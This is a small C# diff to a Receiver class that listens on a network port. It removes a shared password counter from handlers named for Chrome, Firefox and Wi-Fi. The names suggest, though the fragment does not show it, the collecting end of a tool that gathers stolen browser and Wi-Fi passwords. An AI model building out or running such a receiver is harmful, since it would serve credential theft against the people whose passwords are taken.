@@ -6,10 +6,9 @@ namespace PS03.Network.Receive
 {
     public class Receiver
     {
-        private static readonly PasswordCounter pwc = new PasswordCounter();
-        private readonly ChromeHandler chromehandler = new ChromeHandler(pwc);
-        private readonly FirefoxHandler firefoxhandler = new FirefoxHandler(pwc);
-        private readonly WifiHandler wifihandler = new WifiHandler(pwc);
+        private readonly ChromeHandler chromehandler = new ChromeHandler();
+        private readonly FirefoxHandler firefoxhandler = new FirefoxHandler();
+        private readonly WifiHandler wifihandler = new WifiHandler();
 
 
         public void Run(int port)
